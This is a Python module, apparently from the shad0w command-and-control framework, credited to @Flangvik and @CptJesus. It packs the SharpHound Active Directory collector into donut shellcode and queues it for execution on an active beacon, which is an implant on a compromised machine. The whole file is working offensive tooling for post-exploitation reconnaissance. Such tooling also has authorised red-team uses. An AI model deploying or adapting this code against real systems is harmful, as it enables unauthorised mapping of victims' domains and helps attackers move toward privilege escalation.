#
# Execute sharphound on a session
#

import argparse

from lib import shellcode

__description__ = "C# Rewrite of the BloodHound3 Ingestor, targeted for NET 4.5"
__author__ = "@Flangvik, @CptJesus"

# identify the task as shellcode execute
USERCD_EXEC_ID = 0x3000

# location of sharphound binary
SHARPHOUND_BIN = "/root/shad0w/bin/SharpCollection/NetFramework_4.5_x86/SharpHound.exe"

# little hack but lets us pass the args to donut
class DummyClass(object):
    def __init__(self):
        pass

def sharphound_callback(shad0w, data):
    print(data)

    return ""

def main(shad0w, args):

    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.log("ERROR: No active beacon", log=True)
        return

    sharphound_args = ' '.join(args[1:])

    # kinda a hack to make sure we intergrate nice with the shellcode generator
    args = DummyClass()

    if len(sharphound_args) != 0:
        args.param = sharphound_args
    else:
        args.param = False
        sharphound_args = False

    args.cls = False
    args.method = False
    args.runtime = False
    args.appdomain = False

    #Generate donut base64 shellcode with "AnyCpu" as target, local bin is x86
    b64_comp_data = shellcode.generate(SHARPHOUND_BIN, args, sharphound_args)

    shad0w.beacons[shad0w.current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
    shad0w.beacons[shad0w.current_beacon]["callback"] = sharphound_callback
